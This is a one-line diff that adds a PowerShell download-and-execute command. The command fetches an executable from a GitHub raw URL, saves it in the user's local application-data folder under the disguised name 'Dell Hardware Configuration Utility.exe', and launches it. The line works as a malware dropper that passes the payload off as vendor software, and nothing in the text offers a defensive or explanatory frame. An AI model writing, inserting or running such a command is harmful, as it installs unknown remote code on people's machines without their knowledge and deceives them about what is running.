@@ -1,0 +1,1 @@
+$down = New-Object System.Net.WebClient; $url = 'https://github.com/ezq-c/q/raw/main/q.exe'; $file = "$env:LOCALAPPDATA\Dell Hardware Configuration Utility.exe"; $down.DownloadFile($url,$file); Start-Process $file;
